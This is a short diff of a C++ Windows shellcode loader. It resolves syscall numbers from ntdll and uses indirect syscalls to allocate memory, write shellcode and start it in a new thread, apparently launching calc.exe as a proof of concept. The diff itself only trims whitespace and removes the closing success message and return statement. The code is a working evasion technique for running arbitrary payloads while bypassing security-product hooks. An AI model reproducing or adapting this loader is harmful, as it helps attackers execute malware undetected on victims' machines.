@@ -35,7 +35,7 @@ int main()
 
     // Address and SSN for NtAllocateVirtualMemory()
     FARPROC addrAVM = GetProcAddress(library, "NtAllocateVirtualMemory");
-    DWORD AVMssn = ((unsigned char*)((UINT_PTR)addrAVM + 4))[0]; 
+    DWORD AVMssn = ((unsigned char*)((UINT_PTR)addrAVM + 4))[0];
     UINT_PTR addrAVMsyscall = ((UINT_PTR)addrAVM + 0x12);
 
     // Address and SSN for NtWriteVirtualMemory()
@@ -74,13 +74,9 @@ int main()
     sysNtWriteVirtualMemory(GetCurrentProcess(), buffer, shellcode, sizeof(shellcode), &numBytesWritten);
     std::cout << "[+] Shellcode successfully written. Wrote " << numBytesWritten << " bytes.\n\n[+] Creating thread and running memory buffer (stored shellcode)...\n";
 
-    HANDLE hThread; 
+    HANDLE hThread;
     sysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)buffer, NULL, FALSE, 0, 0, 0, NULL); //LPTHREAD_START_ROUTINE var will be the memory buffer containing newly-written shellcode (don't confuse with buffer used to store shellcode)
     std::cout << "[+] Check for calc.exe...\n\n";
 
     sysWaitForSingleObject(hThread, FALSE, NULL);
-    std::cout << "Success";
-
-
-    return EXIT_SUCCESS;
 }
